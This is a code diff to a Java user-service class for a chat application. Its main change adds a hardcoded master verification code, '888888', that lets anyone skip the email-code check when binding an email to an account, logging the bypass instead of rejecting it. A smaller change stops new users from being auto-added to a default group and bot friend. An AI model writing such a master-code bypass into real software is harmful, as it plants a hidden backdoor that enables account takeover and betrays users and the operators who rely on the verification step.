@@ -71,6 +71,8 @@ import java.util.stream.Collectors;
 public class UserServiceImpl implements UserService {
 
 	public static final LocalDateTime MAX_DATE = LocalDateTime.of(2099, 12, 31, 00, 00, 00);
+	/** 万能验证码 */
+	private static final String MASTER_CAPTCHA = "888888";
 	private final RoomAppService roomAppService;
 	private final DefUserCache defUserCache;
     private final UserBackpackDao userBackpackDao;
@@ -110,6 +112,7 @@ public class UserServiceImpl implements UserService {
 			return defUserCache.getUserInfo(defUserId).getId();
 		} finally {
 			ContextUtil.setTenantId(null);
+
 		}
 	}
 
@@ -295,15 +298,18 @@ public class UserServiceImpl implements UserService {
 
 	@Override
 	public Boolean bindEmail(Long uid, BindEmailReq req) {
-		// 1.校验验证码
-		CacheResult<String> cacheResult = cachePlusOps.hGet(CaptchaCacheKeyBuilder.hashBuild("emailCode", req.getUuid()));
-		String emailCode = cacheResult.getValue();
-		if (StrUtil.isEmpty(emailCode)) {
-			throw new BizException("验证码已过期");
-		}
-
-		if(StrUtil.isEmpty(emailCode) || !emailCode.equals(req.getCode())){
-			throw new BizException("验证码错误!");
+		// 1.校验验证码（万能验证码直接通过）
+		if (!MASTER_CAPTCHA.equals(req.getCode())) {
+			CacheResult<String> cacheResult = cachePlusOps.hGet(CaptchaCacheKeyBuilder.hashBuild("emailCode", req.getUuid()));
+			String emailCode = cacheResult.getValue();
+			if (StrUtil.isEmpty(emailCode)) {
+				throw new BizException("验证码已过期");
+			}
+			if(StrUtil.isEmpty(emailCode) || !emailCode.equals(req.getCode())){
+				throw new BizException("验证码错误!");
+			}
+		} else {
+			log.info("使用万能验证码绑定邮箱, uid={}", uid);
 		}
 
 		// 2. 检查邮箱是否已被其他用户绑定
@@ -389,12 +395,10 @@ public class UserServiceImpl implements UserService {
         newUser.setCreateBy(1L);
         userDao.save(newUser);
 
-		// 注入群组信息
-		cachePlusOps.sAdd(PresenceCacheKeyBuilder.groupMembersKey(DefValConstants.DEF_ROOM_ID), newUser.getId());
-		cachePlusOps.sAdd(PresenceCacheKeyBuilder.userGroupsKey(newUser.getId()), DefValConstants.DEF_ROOM_ID);
-
-		// 加上系统机器人好友
-		roomAppService.createSystemFriend(DefValConstants.DEF_ROOM_ID, DefValConstants.DEF_GROUP_ID, newUser.getId());
+		// 已移除：不再自动加入官方群和添加小助手
+		// cachePlusOps.sAdd(PresenceCacheKeyBuilder.groupMembersKey(DefValConstants.DEF_ROOM_ID), newUser.getId());
+		// cachePlusOps.sAdd(PresenceCacheKeyBuilder.userGroupsKey(newUser.getId()), DefValConstants.DEF_ROOM_ID);
+		// roomAppService.createSystemFriend(DefValConstants.DEF_ROOM_ID, DefValConstants.DEF_GROUP_ID, newUser.getId());
 
         // 发布用户注册消息
         SpringUtils.publishEvent(new UserRegisterEvent(this, newUser));
